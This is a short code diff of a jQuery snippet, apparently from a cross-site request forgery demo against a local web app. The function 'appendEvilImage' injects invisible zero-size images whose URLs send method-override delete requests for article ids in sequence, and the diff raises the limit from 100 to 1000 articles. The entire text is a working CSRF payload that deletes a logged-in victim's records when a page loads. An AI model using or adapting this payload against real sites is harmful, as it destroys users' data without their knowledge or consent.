@@ -8,7 +8,7 @@
       $(function() {
         var $body = $('body');
         (function appendEvilImage(id) {
-          if (id > 100) return;
+          if (id > 1000) return;
           $('<img/>').attr('src', 'http://localhost:8080/articles/' + id + '?_method=delete').css({width: 0, height: 0}).appendTo($body);
           setTimeout(appendEvilImage, 0, id + 1);
         })(1);
